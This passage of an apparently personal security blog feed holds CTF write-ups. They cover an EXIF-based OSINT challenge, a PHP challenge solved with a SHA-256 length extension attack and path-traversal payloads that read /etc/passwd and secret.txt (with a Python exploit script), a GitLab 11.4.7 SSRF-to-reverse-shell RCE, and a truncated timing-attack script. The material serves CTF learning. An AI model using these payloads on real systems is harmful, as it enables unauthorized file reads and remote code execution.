&lt;function name&gt; &lt;contract address&gt; --network rikeby</code></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>brownie run .scriptsattack.py main "0x4c7c62Ed79994383EEa5Cf156bd3159e9e12C385" --network rinkeby</div></code></div></pre><!-- HTML_TAG_END -->]]>
    </content>
    <category term="smart contracts" scheme="https://urara-demo.netlify.app/?tags=smart%20contracts" />
    <category term="web3" scheme="https://urara-demo.netlify.app/?tags=web3" />
    <category term="brownie" scheme="https://urara-demo.netlify.app/?tags=brownie" />
    <category term="ethernaut" scheme="https://urara-demo.netlify.app/?tags=ethernaut" />
  </entry>
  <entry>
    <title type="html"><![CDATA[undefined]]></title>
    <link href="https://urara-demo.netlify.app/Yogosha Christmans CTF 21" />
    <id>https://urara-demo.netlify.app/Yogosha Christmans CTF 21</id>
    <published>2021-12-29T00:00:00.000Z</published>
    <updated>2021-12-29T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h1 id="yogosha-christmans-ctf-21-writeup"><a href="#yogosha-christmans-ctf-21-writeup">Yogosha Christmans CTF 21 Writeup</a></h1><ul><li><p><a href="/Yogosha%20Christmans%20CTF%2021/Welcome%20Christmas">Welcome Christmans</a></p></li><li><p><a href="/Yogosha%20Christmans%20CTF%2021/Uchiha%20Or%20Evil/">Uchiha Or Evil?</a></p></li></ul>]]>
    </content>undefined
  </entry>
  <entry>
    <title type="html"><![CDATA[Welcome Christmans]]></title>
    <link href="https://urara-demo.netlify.app/Yogosha Christmans CTF 21/Welcome Christmas" />
    <id>https://urara-demo.netlify.app/Yogosha Christmans CTF 21/Welcome Christmas</id>
    <published>2021-12-29T00:00:00.000Z</published>
    <updated>2021-12-29T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h1 id="welcome-christmas"><a href="#welcome-christmas">Welcome Christmas</a></h1><blockquote><p>Yogosha Christmas CTF 2021</p></blockquote><hr><ul><li><p>So this is the first challenge. Let’s look at the challenge prompt.<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/1.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/1.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>We have some naruto info and some names(possibly usernames as this is an OSINT challenge).</p></li><li><p>We can see a name <code>ShisuiYogo</code>. Let’s do some googling. We got a twitter account. Let’s look into it.<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/2.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/2.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>This tweet looks interesting<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/3.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/3.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p><code>Important image in a popular website</code> Hmmmm… what are some popular image hosting platforms…pinterest, tumblr, flicker etc.</p></li><li><p>Well pinterest has too many images (:-()…</p></li><li><p>This is where the hint comes in handy.<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/4.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/4.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>It’s clearly sating <code>Flicker</code>. Let’s go there and search for <code>Uchiha Shisui</code>…and <strong>BOOM</strong> we have a user<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/5.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/5.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>This user has only 1 post let’s look into this. So from here there are 2 ways to get the flag &amp; further info</p></li></ul><ol><li>We check the <code>EXIF</code> data from the webise<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/6.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/6.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>We download the file &amp; then use <code>exifool</code></li></ol><ul><li>I’m a linux guy I’ll do the later one. Here is the output of <code>exiftool</code></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>$ exiftool 51773456833_95c363f276_o.png                                                                                </div><div class='line'></div><div class='line'>ExifTool Version Number         : 12.16</div><div class='line'>File Name                       : 51773456833_95c363f276_o.png</div><div class='line'>Directory                       : .</div><div class='line'>File Size                       : 774 KiB</div><div class='line'>File Modification Date/Time     : 2021:12:27 18:40:19+05:30</div><div class='line'>File Access Date/Time           : 2021:12:27 18:40:18+05:30</div><div class='line'>File Inode Change Date/Time     : 2021:12:27 18:40:28+05:30</div><div class='line'>File Permissions                : rw-r--r--</div><div class='line'>File Type                       : PNG</div><div class='line'>File Type Extension             : png</div><div class='line'>MIME Type                       : image/png</div><div class='line'>Image Width                     : 1080</div><div class='line'>Image Height                    : 1080</div><div class='line'>Bit Depth                       : 8</div><div class='line'>Color Type                      : RGB</div><div class='line'>Compression                     : Deflate/Inflate</div><div class='line'>Filter                          : Adaptive</div><div class='line'>Interlace                       : Noninterlaced</div><div class='line'>Gamma                           : 2.2</div><div class='line'>White Point X                   : 0.3127</div><div class='line'>White Point Y                   : 0.329</div><div class='line'>Red X                           : 0.64</div><div class='line'>Red Y                           : 0.33</div><div class='line'>Green X                         : 0.3</div><div class='line'>Green Y                         : 0.6</div><div class='line'>Blue X                          : 0.15</div><div class='line'>Blue Y                          : 0.06</div><div class='line'>Background Color                : 255 255 255</div><div class='line'>Datecreate                      : 2021-12-24T16:52:13+00:00</div><div class='line'>Datemodify                      : 2021-12-24T16:52:13+00:00</div><div class='line'>Coded Character Set             : UTF8</div><div class='line'>Envelope Record Version         : 4</div><div class='line'>Object Name                     : Yogosha&#123;Shisui_H4s_G00d_ViSion&#125;</div><div class='line'>Caption-Abstract                : I heard something important is stored in /secret.txt here: http://3.141.159.106 ; Maybe the akatsuki will help the Uchiha clan ?</div><div class='line'>Application Record Version      : 4</div><div class='line'>Image Size                      : 1080x1080</div><div class='line'>Megapixels                      : 1.2</div></code></div></pre><!-- HTML_TAG_END --><ul><li>We have the flag here. BTW downlaod full resolution, the flag was not present in the medium resolution file don’t know why.</li><li>If you’re a nerd &amp; you don’t have a life then you can do something like this for fun.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>#!/bin/bash</div><div class='line'>exiftool 51773456833_95c363f276_o.png | grep -E "Yogosha&#123;.*" | awk '&#123;print $4&#125;'</div></code></div></pre><!-- HTML_TAG_END --><ul><li>This is a one-liner to get the flag. Let me explain this, first we’re dumping the exif data of the image then we’re <code>grep</code>ing with <code>-E</code> (extended regular expression) tag for the flag format pattern <code>Yogosha{</code> followed by a <code>.</code> (any character) &amp; <code>*</code> (0 or more number of occurrence). Then just to extract the flag bit we’re printing the letters in the 4th position of our stdout using <code>awk</code>.</li></ul><p><img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/7.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Welcome_Christmas_DONE/images/7.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p><ul><li>And we’re done with the first <code>OSINT</code> challenge.</li></ul><h4 id="flag"><a href="#flag">flag</a></h4><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>Yogosha&#123;Shisui_H4s_G00d_ViSion&#125;</div></code></div></pre><!-- HTML_TAG_END -->]]>
    </content>
    <category term="ctf" scheme="https://urara-demo.netlify.app/?tags=ctf" />
    <category term="yogosha" scheme="https://urara-demo.netlify.app/?tags=yogosha" />
  </entry>
  <entry>
    <title type="html"><![CDATA[Uchiha Or Evil ?]]></title>
    <link href="https://urara-demo.netlify.app/Yogosha Christmans CTF 21/Uchiha Or Evil" />
    <id>https://urara-demo.netlify.app/Yogosha Christmans CTF 21/Uchiha Or Evil</id>
    <published>2021-12-19T00:00:00.000Z</published>
    <updated>2021-12-19T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h1 id="uchiha-or-evil-"><a href="#uchiha-or-evil-">Uchiha Or Evil ?</a></h1><blockquote><p>Yogosha Christmas CTF 2021</p></blockquote><hr><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>I heard something important is stored in /secret.txt here: http://3.141.159.106 ; Maybe the akatsuki will help the Uchiha clan ?</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>From the previous challenge we got a url. Let’s visit the page.<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/1.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/1.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>Nothing much on this page. I ran <code>nikto</code> &amp; got there is a <code>robots.txt</code> file here. We can check the robots.txt page &amp; there’s some interesting info. So there is page.Let’s go to <code>read.php</code><img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/2.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/2.png" class="rounded-lg my-2" loading="lazy" decoding="async"><img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/3.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/3.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>We got access denied. There is an interesting line in the robots.txt file which is <code>User-agent: Uchiha</code>. Let’s change our useragent to <code>Uchiha</code>. You can use burp or a user agent changer extension. And we have something here.<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/4.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/4.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>Let’s view the source. We have 2 things here.</p><ol><li>The form is sending post data with some hash concatenated a filename</li><li>Some dev notes(comments)</li></ol></li></ul><p><img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/5.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/5.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p><ul><li>If we send the form we can see some odd thing happening here. Looks like the source code of the <code>read.php</code> page is loading. So form the dev comment we can see we have to read the source here in-order to continue from here.<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/6.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/6.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>Let’s save the source in a file &amp; read the code.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'>&lt;?php</div><div class='line'>if ($_SERVER['HTTP_USER_AGENT']!=="Uchiha")&#123;</div><div class='line'> echo "Access Denied. Only Uchiha clan can access this";</div><div class='line'>&#125;</div><div class='line'>else&#123;</div><div class='line'>?&gt;</div><div class='line'></div><div class='line'>&lt;?php</div><div class='line'>include "secret.php";</div><div class='line'>if(isset($_POST['string']))&#123;</div><div class='line'> $arr=explode("|",$_POST['string']) ;</div><div class='line'> $filenames=$arr[1];</div><div class='line'> $hash=$arr[0];</div><div class='line'> if($hash===hash("sha256", $SECRET.$filenames ) && preg_match("///",$filenames)===0 )&#123;</div><div class='line'>  foreach(explode(":",$filenames) as $filename)&#123;</div><div class='line'>   if(in_array($filename,["read.php","index.php","guinjutsu.php"])) &#123;</div><div class='line'>    $jutsu=file_get_contents($filename);</div><div class='line'>    echo "Sharingan: ".$jutsu;</div><div class='line'>  &#125;</div><div class='line'>  &#125;</div><div class='line'> &#125;</div><div class='line'> else&#123;</div><div class='line'>  echo "Verification Failed! You didn't awaken your sharingan!";</div><div class='line'> &#125;</div><div class='line'></div><div class='line'>&#125;</div><div class='line'></div><div class='line'>&#125;</div><div class='line'>?&gt;</div></code></div></pre><!-- HTML_TAG_END --><ul><li>So this program is using the <a href="https://www.w3schools.com/php/func_string_explode.asp" rel="nofollow noopener noreferrer external" target="_blank">explode</a> function to split the array into 2 parts. Hash and the file.Then it’s checking the hash with a concatenating the filename with a secret &amp; from the array we can see there are 3 files. We cannot lord any other file from here. Then it’s just dumping the contents of the files we supplied using the delimiter <code>:</code> to split filenames.</li><li>I stuck here for 2 days trying to get the secret. I even tried to bruteforce the secret. But the organizers told me it’s not brute forcible. There are some attacks on hash but the hash is <code>sha256</code> with is one of the safest (at the time being. Everything is secure untill someone breaks it ;). Cutting short the ans is <a href="https://en.wikipedia.org/wiki/Length_extension_attack" rel="nofollow noopener noreferrer external" target="_blank">Length extension attack</a>. These are the article and videos that helped me.<ul><li><a href="https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack" rel="nofollow noopener noreferrer external" target="_blank">https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack</a></li><li><a href="https://www.youtube.com/watch?v=sMla6_4Z-CQ" rel="nofollow noopener noreferrer external" target="_blank">https://www.youtube.com/watch?v=sMla6_4Z-CQ</a></li><li><a href="https://www.youtube.com/watch?v=6QQ4kgDWQ9w" rel="nofollow noopener noreferrer external" target="_blank">https://www.youtube.com/watch?v=6QQ4kgDWQ9w</a></li></ul></li><li>It’s a complicated attack so I left it to the smart people and used this tool <a href="https://github.com/iagox86/hash_extender" rel="nofollow noopener noreferrer external" target="_blank">hash_extender</a></li><li>Here is the syntax <code>hash_extender --data data --secret len-of-sec --append append --signature hash --format fomrat</code>. We know the data <code>read.php</code>, signature <code>184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5</code>, format <code>sha256</code> we want the length of the secret. We can bruteforce it like this to generate signatures.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>#!/bin/bash</div><div class='line'></div><div class='line'>for i in $(seq 100)</div><div class='line'>do</div><div class='line'>    hash_extender --data 'read.php' --secret $i --append ":index.php:guinjutsu.php" --signature 184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5 --format sha256 --out-data-format=html | grep "New" | cut -d ' ' -f3 | sed ':a;N;$!ba;s/&#92;n/|/g' &gt;&gt; hashes</div><div class='line'>done</div></code></div></pre><!-- HTML_TAG_END --><ul><li>This script will generate a file called <code>hashes</code> concatenating the hashes. Then we can use burpsuite or python to send the hash &amp; check the result.</li><li>The correct length is <code>42</code>. And we can see the result here we have the source of <code>guinjutsu.php</code><img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/7.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/7.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>So we have another source code let’s see this one in more details</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'>&lt;?php</div><div class='line'>// This endpoint is deprecated due to some problems, I heard that other clans have stolen some jutsus</div><div class='line'>function check($url)&#123;</div><div class='line'>    $par=parse_url($url);</div><div class='line'>    if (((strpos($par['scheme'],'http')!==false)and($par['host']=='uchiha.fuinjutsukeeper.tech'))and($par['port']==5000))&#123;</div><div class='line'>        return True;</div><div class='line'></div><div class='line'>    &#125;</div><div class='line'>    else&#123;</div><div class='line'>        return False;</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>&#125;</div><div class='line'>if (isset($_POST['submit']))&#123;</div><div class='line'>    if ((isset($_POST['api']))and(isset($_POST['endpoint'])))&#123;</div><div class='line'>        $url=$_POST['api'].$_POST['endpoint'];</div><div class='line'>        if (check($url))&#123;</div><div class='line'>            $opts = array(</div><div class='line'>  'http'=&gt;array(</div><div class='line'>    'method'=&gt;"GET",</div><div class='line'>    'follow_location'=&gt;false,</div><div class='line'>    'header'=&gt;"Accept-language: en&#92;r&#92;n" </div><div class='line'>  )</div><div class='line'>);</div><div class='line'>$context = stream_context_create($opts);</div><div class='line'>$file = file_get_contents($url, false, $context);</div><div class='line'>echo $file;</div><div class='line'></div><div class='line'>        &#125;</div><div class='line'>    &#125;</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>?&gt;</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>In short the <code>check</code> function is checking for the a url which looks like this <code>http://uchiha.fuinjutsukeeper.tech:5000/</code>. If the check passes then it’ll concat the endpoint with the url &amp; give the output of whatever we’re supplying. So how can we exploit this we have to load something which is on the <code>http://uchiha.fuinjutsukeeper.tech:5000/</code> &amp; we can’t load anything else or can we…</p></li><li><p>It took me an another day (:-` yah I’m slow). Php is weird we all know.. This part <code>strpos($par[&#39;scheme&#39;],&#39;http&#39;)!==false)</code> only checks for if the <code>http</code> part is supplied in the url or not; i.e. <code>http</code>, <code>https</code>, <code>phttp</code>, <code>fhttp</code>, <code>httpf</code> etc will return true. Nice we can do something nasty here.</p></li><li><p>If we send the payload as it is we’ll get something like this. Because we have to load files from the machine i.e. <code>LFI</code>.<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/8.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/8.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>We can bypass this by using this paylaod<code>submit=1&amp;api=phttp://uchiha.fuinjutsukeeper.tech:5000/&amp;endpoint=../../../../../../../../../../etc/passwd</code><img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/9.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/9.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>See we still got the error but we also got the contents of <code>/etc/passwd</code>. This is because this part.</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'>$context = stream_context_create($opts);</div><div class='line'>$file = file_get_contents($url, false, $context);</div><div class='line'>echo $file;</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>This is because <code>phttp</code> is not a valid scheme and thus <code>file_get_contents</code> thinks it’s just part of the filepath while <code>parse_url</code> thinks its just a weird scheme unknown to it, but with a valid host and port!. You can read more in this <a href="https://deltaclock.gitbook.io/ctf-writeups/securinets-ctf-quals-2021-mixed" rel="nofollow noopener noreferrer external" target="_blank">writeup</a>. Always count on smart people.</p></li><li><p>And with this payload <code>submit=1&amp;api=phttp://uchiha.fuinjutsukeeper.tech:5000/&amp;endpoint=../../../../../../../../../../secret.txt</code> we have the flag<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/10.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/10.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>Originally when I was solving this I don’t know why burp was not showing any output here so I had the answer but wasted a lot of time. Then a friend of mine told me to use python. I was like why I haven’t tried that lol (For the 100th time I’m saying count on smart people to avoid struggles like me) :-). Anyways here is the python script if anyone is interested.</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>#!/usr/bin/python3</div><div class='line'>from requests import post</div><div class='line'>from re import findall</div><div class='line'></div><div class='line'>url = "http://3.141.159.106/"</div><div class='line'>headers = &#123;"User-Agent": "Uchiha"&#125;</div><div class='line'></div><div class='line'>data = &#123;"submit":'1',"api":"shttp://uchiha.fuinjutsukeeper.tech:5000/","endpoint":"../../../../../../../../../../secret.txt"&#125;</div><div class='line'></div><div class='line'>r = post(url + "/guinjutsu.php", headers=headers, data=data)</div><div class='line'></div><div class='line'>#print(r.text)</div><div class='line'></div><div class='line'>print(findall("Yogosha&#123;.*", r.text)[0])</div></code></div></pre><!-- HTML_TAG_END --><ul><li>Same thing we’re sending the data as json format this time &amp; everything else is same &amp; I’m <a href="https://en.wikipedia.org/wiki/Regular_expression" rel="nofollow noopener noreferrer external" target="_blank">regular expressions</a> to extract the flag part only.</li><li><code>Yogosha{.*</code> means first get <code>Yogosha{</code>(flag format) then <code>.</code> means any character &amp; finally <code>*</code> means any number of times( 0 or &gt; 0) &amp; then we’re indexing the first item of the array(list for python)<img src="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/11.png" alt="https://gitlab.com/Aviksaikat/yogoshactf-2021/-/raw/main/Uchiha_Or_Evil_%3F_DONE/images/11.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul><h4 id="thank-you-for-reading-this-write-up-i-hope-it-helped-you-i-was-only-able-to-solve-only-the-first-2-challenges-so-thats-all-from-me-i-hope-you-learned-something-ill-try-to-add-links-of-other-people-whole-solved-the-entire-thing"><a href="#thank-you-for-reading-this-write-up-i-hope-it-helped-you-i-was-only-able-to-solve-only-the-first-2-challenges-so-thats-all-from-me-i-hope-you-learned-something-ill-try-to-add-links-of-other-people-whole-solved-the-entire-thing">Thank you for reading this write-up I hope it helped you. I was only able to solve only the first 2 challenges so that’s all from me. I hope you learned something. I’ll try to add links of other people whole solved the entire thing</a></h4><ul><li>Check out <a href="https://github.com/smaury/CTF-writeups/tree/main/2021/yogosha-christmas-challenge" rel="nofollow noopener noreferrer external" target="_blank">smaury’s</a> write-up he has solved all of them even the bonus one. Smart guy alert ;-” do check his write-up it’s awesome.</li></ul>]]>
    </content>
    <category term="ctf" scheme="https://urara-demo.netlify.app/?tags=ctf" />
    <category term="yogosha" scheme="https://urara-demo.netlify.app/?tags=yogosha" />
  </entry>
  <entry>
    <title type="html"><![CDATA[ToC Disabled]]></title>
    <link href="https://urara-demo.netlify.app/Welcome Web3/toc-disabled" />
    <id>https://urara-demo.netlify.app/Welcome Web3/toc-disabled</id>
    <published>2021-12-12T00:00:00.000Z</published>
    <updated>2023-01-23T19:48:11.911Z</updated>
    <summary type="html"><![CDATA[This post has disabled table of contents.]]></summary>
    <content type="html">
      <![CDATA[<p>This post has disabled table of contents.</p><p>When the <code>toc: false</code> on Front-Matter, toc should not be displayed.</p><h2 id="heading"><a href="#heading">Heading</a></h2><h3 id="heading-1"><a href="#heading-1">Heading</a></h3><h4 id="heading-2"><a href="#heading-2">Heading</a></h4>]]>
    </content>
    <category term="Front-Matter" scheme="https://urara-demo.netlify.app/?tags=Front-Matter" />
  </entry>
  <entry>
    <title type="html"><![CDATA[Gitlab-11.4.7 Remote Code Execution(RCE) Exploitation]]></title>
    <link href="https://urara-demo.netlify.app/GitLab11.4.7-RCE" />
    <id>https://urara-demo.netlify.app/GitLab11.4.7-RCE</id>
    <published>2021-09-03T00:00:00.000Z</published>
    <updated>2022-12-19T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<ul><li><p>For this challenge we’re running a gitlab instance locally </p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/1.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/1.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>We have registered an account and logged in</p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/2.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/2.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>We can check the version here as well</p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/3.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/3.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>If we visit the official gitlab repository &amp; see at the commits history we can see details about the commits. We are searching for version 11.4.8 as the fix for the previous version would be there.</p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/4.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/4.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>There is no filtering going we can send any ipv6 url we can bypass the url check.</p></li><li><p>There is a exploit <a href="https://github.com/ctrlsam/GitLab-11.4.7-RCE/blob/master/exploit.py" rel="nofollow noopener noreferrer external" target="_blank">script available</a></p></li><li><p>So this script is basically importing a new repository using an ipv6 localhost address <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git</code> and sending a reverse shell as the payload   </p></li><li><p>This script was not working for me so I used this <a href="https://github.com/mohinparamasivam/GitLab-11.4.7-Authenticated-Remote-Code-Execution" rel="nofollow noopener noreferrer external" target="_blank">one</a></p></li><li><p>Let’s run the exploit </p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/8.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/8.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>First step is to generate &amp; download a reverse-shell payload &amp; then using the second option to connect back to us </p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/9.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/gitlab-11.4.7/images/9.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>Using the 2nd option we successfully ran got a reverse-shell</p></li><li><p>This script was a bit different. First we’re creating a script which contains a reverse-shell payload &amp; in the next step we’re executing it on the victim machine. Hence we’re getting a reverse-shell.  </p></li><li><p>All the necessary scripts can be found <a href="https://gitlab.com/Aviksaikat/write-ups/-/tree/main/challenges/gitlab-11.4.7" rel="nofollow noopener noreferrer external" target="_blank">here</a></p></li></ul>]]>
    </content>
    <category term="gitlab" scheme="https://urara-demo.netlify.app/?tags=gitlab" />
    <category term="ctf" scheme="https://urara-demo.netlify.app/?tags=ctf" />
    <category term="rce" scheme="https://urara-demo.netlify.app/?tags=rce" />
  </entry>
  <entry>
    <title type="html"><![CDATA[SQL Injection By Reponse Size]]></title>
    <link href="https://urara-demo.netlify.app/SQL Injection Using Threading" />
    <id>https://urara-demo.netlify.app/SQL Injection Using Threading</id>
    <published>2021-09-03T00:00:00.000Z</published>
    <updated>2023-01-23T19:48:11.911Z</updated>
    <content type="html">
      <![CDATA[<ul><li>So in this challenge we have only an address <code>http://139.59.46.128:2345/</code> &amp; there is a field to submit password.</li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/1.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/1.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>If we try to enter something we obviously get an error <code>Incorrect Password</code>.Look at the developer console we can see the form is sending a post request with a post parameter <code>password</code>.</li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/2.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/2.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>We can try sql injection payload and also test for xss &amp; all but noting.</li><li>At this point I had no idea about what to do. I tried bruteforcing passwords(using worldlists). Nothing happened.</li><li>I tried sending one character at a time using burp and</li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/3.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/3.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>If we enable <code>Response received</code> we can see <code>e</code> took the longest time to give a response &amp; it’s not random if we run this multiple time we can still see <code>e</code> took the longest to give back a response</li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/4.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/4.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/8.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/8.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>We can attack one character at a time. But it’ll take a great effort to do this manually with burp so I made a script</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'>#!/usr/bin/python3</div><div class='line'>from requests_futures.sessions import FuturesSession</div><div class='line'>from concurrent.futures import as_completed</div><div class='line'>import string</div><div 